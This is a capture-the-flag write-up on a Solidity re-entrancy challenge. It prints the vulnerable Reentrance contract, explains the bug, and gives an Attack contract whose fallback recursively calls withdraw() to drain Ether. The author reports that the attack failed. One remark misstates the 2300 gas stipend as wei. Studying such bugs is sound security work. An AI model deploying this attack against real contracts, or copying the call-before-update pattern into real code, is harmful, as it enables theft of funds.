# Re-entrancy
###### tags: `writeup`
```javascript
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```

Reentrant means that a function can be interrupted in the middle of its execution and then safely be called again ("re-entered") before its previous invocations complete execution.

Any interaction from a contract A with another contract B and any transfer of Ether hands over control to that contract B. 

This makes it possible for B to call back into A before this interaction is completed.

So if you deploy a contract as B then use a fallback function to make A hand over Ether again(It must be reentrant), that will turn this loop into recursive.

For `transfer()` and `send()`, there's limit 2300 wei for gas, exceed this limit, hand over will be cancel.

However, here's `call.value(_amount)()` doesn't set the limit, therefore it uses all it got as gas to make sure this transfer succeed.


```go
pragma solidity ^0.4.18;
 
contract Reentrance {
 
  mapping(address => uint) public balances;
 
  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }
 
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
 
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
 
  function() public payable {}
}
contract Attack {

    address instance_address = 0xbbb055bd95b6e17d92b4d9c4a1a4696d69a0af1f;
    Reentrance target = Reentrance(instance_address);

    function Attack() payable{}
    // donate some ether to make withdraw accept
    function donate() public payable {
        target.donate.value(msg.value)(this);
    }    

    function get_balance() public view returns(uint) {
        return target.balanceOf(this);
    }

    function myBalance() public view returns(uint) {
        return address(this).balance;
    }

    function targetBalance() public view returns(uint) {
        return instance_address.balance;
    }
    // Make target start transfer
    function attack() public {
        target.withdraw(0.5 ether);
    }
    // Make it become recursive
    function () public payable {
        target.withdraw(0.5 ether);
    }
}
```
Well, I try hard but it just false my interaction, then sub my balances without sending any Ether.

Without fallback function, `withdraw()` will work pretty good though.

~~I think I need to debug this problem another day then.~~

![](https://i.imgur.com/TtoyUEV.png)

It seems the limit of call.value of this instance is also weird. 

Also due to my contract's withdraw() fail, instance should not sub amount from my account.

I afraid this level get some hotfix in wrong way(more secure).